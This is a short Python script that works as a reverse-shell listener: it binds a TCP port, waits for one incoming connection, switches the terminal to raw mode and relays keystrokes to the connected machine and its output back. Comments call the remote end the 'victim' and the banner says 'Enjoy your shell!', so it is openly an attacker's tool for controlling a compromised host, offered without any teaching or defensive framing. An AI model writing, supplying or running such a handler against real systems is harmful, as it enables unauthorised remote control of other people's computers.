import socket
import sys
import os
import tty
import termios
import select

def set_terminal_raw():
    try:
        old_settings = termios.tcgetattr(sys.stdin)
        tty.setraw(sys.stdin.fileno())
        return old_settings
    except:
        return None

def restore_terminal(old_settings):
    if old_settings:
        try:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
        except:
            pass

def start_listener(port):
    old_settings = None
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(1)
        
        print(f"[+] Listening on 0.0.0.0:{port} ...")
        conn, addr = s.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")
        print(f"[+] Enjoy your shell!\n")
        
        old_settings = set_terminal_raw()
        
        while True:
            ready, _, _ = select.select([conn, sys.stdin], [], [])
            
            for src in ready:
                if src == conn:
                    # Data from victim
                    data = conn.recv(4096)
                    if not data:
                        print("\r\n[!] Connection closed\r")
                        return
                    # Write directly to stdout
                    os.write(sys.stdout.fileno(), data)
                    
                elif src == sys.stdin:
                    # Data from keyboard
                    data = os.read(sys.stdin.fileno(), 4096)
                    if not data:
                        return
                    conn.send(data)
        
    except KeyboardInterrupt:
        print("\r\n[!] Interrupt received\r")
    except Exception as e:
        print(f"\r\n[-] Error: {e}\r")
    finally:
        restore_terminal(old_settings)
        try:
            conn.close()
            s.close()
        except:
            pass
        print("[+] Connection closed")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <port>")
        sys.exit(1)
    
    port = int(sys.argv[1])
    start_listener(port)
